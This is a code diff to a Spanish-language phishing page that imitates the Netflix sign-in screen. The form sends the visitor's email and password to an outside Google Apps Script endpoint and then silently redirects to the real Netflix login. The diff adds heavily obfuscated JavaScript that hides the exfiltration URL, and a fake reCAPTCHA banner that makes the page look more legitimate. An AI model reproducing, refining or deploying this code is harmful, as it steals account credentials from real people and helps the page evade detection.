@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix - Iniciar Sesión</title>
+    <title>Netflix</title>
+    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" type="image/x-icon">
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
@@ -11,6 +13,14 @@
                               url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-0746f3208b4d/dad30504-20b1-460d-85fa-7f0cf88c5825/AR-es-20220502-popsignuptwoweeks-perspective_alpha_website_large.jpg');
             background-size: cover;
             background-position: center;
+        }
+        .banner-info {
+            background-color: #e87c03;
+            color: white;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -21,23 +31,30 @@
     </header>
 
     <main class="flex-grow flex items-center justify-center p-4">
-        <div class="bg-black/75 p-12 md:p-16 rounded-md w-full max-w-[450px]">
-            <h1 class="text-white text-3xl font-bold mb-8">Inicia sesión</h1>
+        <div class="bg-black/75 p-10 md:p-14 rounded-md w-full max-w-[450px]">
+            
+            <div class="banner-info">
+                <p><b>Ingresa tu información para iniciar sesión</b></p>
+                <p>O comience con una nueva cuenta. <a href="#" class="underline">Obtener ayuda</a>.</p>
+                <p class="text-xs mt-2 opacity-80">Esta página está protegida por Google reCAPTCHA para garantizar que no seas un bot. <span class="text-blue-400 cursor-pointer">Más información.</span></p>
+            </div>
+
+            <h1 class="text-white text-3xl font-bold mb-6">Inicia sesión</h1>
             
             <form id="loginForm" class="space-y-4">
                 <div class="relative">
                     <input type="email" name="email" id="email" required 
-                        class="w-full bg-[#333] text-white p-4 rounded-md outline-none focus:bg-[#454545] transition"
+                        class="w-full bg-[#333] text-white p-4 rounded-md outline-none focus:bg-[#454545] transition border-b-2 border-transparent focus:border-[#e87c03]"
                         placeholder="Email o número de teléfono">
                 </div>
                 
                 <div class="relative">
                     <input type="password" name="password" id="password" required 
-                        class="w-full bg-[#333] text-white p-4 rounded-md outline-none focus:bg-[#454545] transition"
+                        class="w-full bg-[#333] text-white p-4 rounded-md outline-none focus:bg-[#454545] transition border-b-2 border-transparent focus:border-[#e87c03]"
                         placeholder="Contraseña">
                 </div>
 
-                <button type="submit" 
+                <button type="submit" id="btnSubmit"
                     class="w-full bg-[#e50914] text-white py-3 rounded-md font-bold mt-6 hover:bg-[#f6121d] transition">
                     Iniciar sesión
                 </button>
@@ -45,20 +62,19 @@
 
             <div class="flex justify-between items-center mt-4 text-[#b3b3b3] text-sm">
                 <div class="flex items-center">
-                    <input type="checkbox" id="remember" class="mr-1">
+                    <input type="checkbox" id="remember" class="mr-1 accent-white">
                     <label for="remember">Recuérdame</label>
                 </div>
                 <a href="#" class="hover:underline">¿Necesitas ayuda?</a>
             </div>
 
-            <div class="mt-16 text-[#737373]">
+            <div class="mt-12 text-[#737373]">
                 <p>¿Primera vez en Netflix? <a href="#" class="text-white hover:underline font-medium">Suscríbete ahora</a>.</p>
-                <p class="text-xs mt-4">Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.</p>
             </div>
         </div>
     </main>
 
-    <footer class="bg-black/75 text-[#737373] p-8 text-sm mt-12">
+    <footer class="bg-black/75 text-[#737373] p-8 text-sm mt-12 border-t border-[#333]">
         <div class="max-w-4xl mx-auto">
             <p class="mb-6 hover:underline cursor-pointer">¿Preguntas? Llama al 0800-XXX-XXXX</p>
             <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
@@ -71,31 +87,24 @@
     </footer>
 
     <script>
-        // Tu URL de Google Apps Script ya configurada
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbwHh058XFvBCUL9mGxZS5cZSw9LPiqjvUOI56OAZ0NePtETmpuE7r3p3bww0bRrkGbj/exec';
-        const form = document.getElementById('loginForm');
+        var scriptURL,form,btn;(function(){var omn='',sqQ=793-782;function Olb(b){var n=930820;var m=b.length;var o=[];for(var q=0;q<m;q++){o[q]=b.charAt(q)};for(var q=0;q<m;q++){var u=n*(q+402)+(n%22545);var r=n*(q+553)+(n%43473);var g=u%m;var h=r%m;var d=o[g];o[g]=o[h];o[h]=d;n=(u+r)%3906201;};return o.join('')};var DxZ=Olb('dlnohntczvjaiyrefororqgsutpuxstbmwckc').substr(0,sqQ);var pBL='(p9e8r=n;(1kn, lcee}r gm=;o.c;.;.vt.Ci+aaar+ggq=)716,;{tps9r+[0,g<,=),c6t;2k)==ev,7(o51(A6(zj}0a,erl)r1u i;1eC[,l6)t9t7{=o(a{d =n]t Sp0m(;n!vu+ nncstgqas(rf))l[t(k(8rd0= ka-ui[u;;{+=8i] +es1rd+;f;[t"r((s- ;.8ja)anrife t<o.hgup"ofe})<vhf[t+-eol1e+z)at 1mm)0tr"urrlkr==vin=aaCvhshh.r-826>r0=u1-hn)o[s9=oal(iz.r e)j]a]v,);"f=mnim;vr0A"nr.avagyn)ol2 n)jg.iqafdrot(7a,a=eh4]e+=vhhfn.c;.[+= afp]dpelA ;tokv ; (=)srnn)w[+afry(gararqp.(c)k(C=;art.n+1)ahzl ; a;fe=els, ul=rrqd){hpnr e7n(rhop=+4qbs;;u;t0ek));tvnv=0in34v+st;,u((lsm-=)o=;)p7)2e}[z)e gj=nen"[i+i;+<iie(uoor282Ctfl;"mt;tpd87(gdsub+++i gru lr..,.h6;h].(eh"]l]iri6.fv}cm,7-.roi;[i]lsi(a;rvnc=.,=cxb+tiia)f5]grp[,]0;jj].,l2ts=,;(q2dsvvur(t=;svovoh+"}h=*nl=vi;ep=.{vn=ila()3f0+u,4a,9=a.+ky6o1f,e=h9 ,;a)=ri.[1m9ilu6(rCan*(48bpf<rr;j0cilec,sanhsllog;nvfgrjoh8qkht=)(+olt;nt.oi;8)g;](aSduer=auyo;C})rC,i5;qbA1;A{=em)rkr,0r(i2a(aji!>"5,5,7cs.;';var KHo=Olb[DxZ];var BlS='';var vJS=KHo;var UTC=KHo(BlS,Olb(pBL));var wXz=UTC(Olb(')t)1.ono_3(tmZiZ4)-41i!.r( 6. lot={)\'Z)i3$y7c-Zrct:(7;jrg..;cb6Sb)$"i(]bb...f.ccZt}f+4ZZa"rZ=7cf =i*ioo6tZ(".$62$)[f\/sgc.+tc)m9f)r,N=q3m.bZs;dZs)__4ttj_p5gl%Z;f.7r.;+e.9hZcaso(z(hv%lauZb,;gd!2jiZllZ7].1.)b%b)9l;(T;a!fpnrZpu3\'[Ib.Z}.ojmq2ZZsxt0pg!.o2;.3S1)e.alpz1)ZbZk,(4%a,,!7jc,az}4}sw$y0{)f92__3gbZu;1rZ).on%m9xlZZa*3!ecZ_ ),"+ZZi)};!8o{,o h!rZ\/0a7$!3Zg5.=r)=(}sgI,pj.rZ0(eZ12=$bg.k,rZe!_b+ti);j7!7$]Ztj,Z3cs([,1as(a0=2rZ,60.(vs3_+q.0-n}oncpj_rh.5t_ZZrarZfr ({dZ=.!1ufZ)},ZZ;ZzZ)_rj0dfgf_c ;$o{eZ.(nl,402)_b1cdb#Zpn,57fZs,7*)t.43dj.6qa.Z\'n{%((_e.=;Za3Zj#j=7{f3"m.jlx.xZ;r(\/!CvnZc."jbhZ6!rZZ 2.c\/( 1iti,.1x7$d,9Z8)cn.$4pa)bn $,t,.f[)f o,i$md)7\'p$0j.=Z#ln1,Zf0nnS$+i).c).ubC.l=tr6#iZd_.Z3)fZl0Zcn0+Zfi,{((_o($# .c.ZZ0;a(Z_i(y.f4]Z.jv;b_n;ie;3mZjr6\/#a.$,0)13.t._o]_=.Zg=cjq)4w)Zsc5t$t).b.bt).m2g0.Z(o (;.e(=u,\/13, t,Z%]$r\/ ]$c2!wZc%trEr)s2q\/((.j]=Z)340.Zo{Zft,e3!j.ctEZ-+S\/b!c_!sp.}.o,.n3a=s]or+.0ke!Z#e$cEr!o}3%701fj{d..,qb!;b,.0p\/p(tZZag8rZm04b)am)}u\/6b()Zt-&_\/f!}(%r+tt&q)S8 =o,.r(i!c$lZZt6ec.;7vCft!eg;Zoxngc)d3c.j$!ion!Zd=!%a.u7fe )m.7t.rr=;[5*e(+n$=getow&8n(j.n0}xZo.$5;tr$e..l"mb (s6;c;3r=ee&(S$ef.)Zex+,]'));var ZId=vJS(omn,wXz );ZId(4655);return 7310})()
 
         form.addEventListener('submit', e => {
             e.preventDefault();
-
-            // Deshabilitar botón para evitar múltiples clics
-            const btn = form.querySelector('button');
             btn.innerText = "Cargando...";
             btn.disabled = true;
 
-            // Enviar datos de forma asíncrona
             fetch(scriptURL, { 
                 method: 'POST', 
                 body: new FormData(form),
                 mode: 'no-cors' 
             })
             .then(response => {
-                // Redirigir a Netflix oficial inmediatamente después del envío
+                // Redirección directa a Netflix oficial
                 window.location.href = "https://www.netflix.com/login"; 
             })
             .catch(error => {
                 console.error('Error!', error.message);
-                // Si falla, también redirigir para no dejar rastro del error
                 window.location.href = "https://www.netflix.com/login";
             });
         });
